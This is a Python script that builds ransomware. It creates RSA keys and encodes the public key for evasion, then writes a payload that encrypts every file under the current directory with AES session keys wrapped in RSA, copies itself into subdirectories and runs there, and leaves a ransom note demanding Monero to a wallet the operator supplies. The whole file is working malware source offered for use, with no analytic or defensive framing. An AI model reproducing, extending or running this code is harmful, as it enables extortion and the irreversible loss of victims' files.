#!/bin/python3.9
import subprocess
import shlex
import base64
from Crypto.PublicKey import RSA

# Create the keys
thekey = RSA.generate(2048)
private_key = thekey.export_key()
public_key = thekey.publickey().export_key()

# You only need the private key for decryption
with open('private.pem', 'wb') as private:
    private.write(private_key)

# Encode the public key to make it more evasive
pubkey_encoded = base64.b64encode(public_key)
filename = input("What would you like to name your file? ")
wallet_address = input("Enter path to XMR wallet address: ")

# Have an XMR wallet ready
with open(wallet_address, "r") as thewallet:
    wallet = thewallet.read()

quantity = input("How much XMR would you like to ransom? ") # XMR is untraceable

# The payload
text = f"""\
#!/usr/bin/python3.9
import base64
import os
import shutil
import shlex
from subprocess import Popen, PIPE
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# Public key goes here
encoded_key = {pubkey_encoded}
public_key = base64.b64decode(encoded_key)

# Get a list of files
files = []

# The encryption function
def encrypt(datafile, publickey):
    datafile = str(datafile)
    with open(datafile, "rb") as f:
        data = f.read()

    data = bytes(data)

    key = RSA.import_key(publickey)
    sessionkey = os.urandom(16)

    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionkey)

    cipher = AES.new(sessionkey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    encryptedFile = datafile
    with open(encryptedFile, "wb") as thefile:
        [ thefile.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]

# Gather the files
def gather(path):
    for root, dirs, files_list in os.walk(path):
        for file in files_list:
            if file == "ransomware.py":
                continue
            files.append(os.path.join(root, file))
    return files

gather('.')
for file in files:
    encrypt(file, public_key)

# This way the payload encrypts everything in subdirectories
subdir = []

# Change this if compiling an executable
cmd = "python3 {filename}"

#Start with the current directory
for dir in os.listdir("."):
    d = os.path.join(".", dir)
    if os.path.isdir(dir):
        subdir.append(dir)

# Spread the malware to subdirectories
for item in subdir:
    subdir = "".join(item)
    shutil.copy("{filename}", item)
    os.chdir(item)
    Popen(shlex.split(cmd), stdin=PIPE, stderr=PIPE, stdout=PIPE)
    print("Files encrypted...")
    os.chdir("..")

# Demand the ransom
wallet = '''{wallet}'''
message = '''
Looks like someone downloaded my ransomware.
Send {quantity} XMR to the wallet provided.

{wallet}
'''
print(message)
with open("ransom.txt", "w") as theransom:
    theransom.write(message)

"""

# Generate the payload
with open(filename, "w") as payload:
    payload.write(text)
    print("Ransomware Generated...")
    executable = f"chmod +x {filename}"
    subprocess.call(shlex.split(executable))
    print("Your file is ready to be executed...")
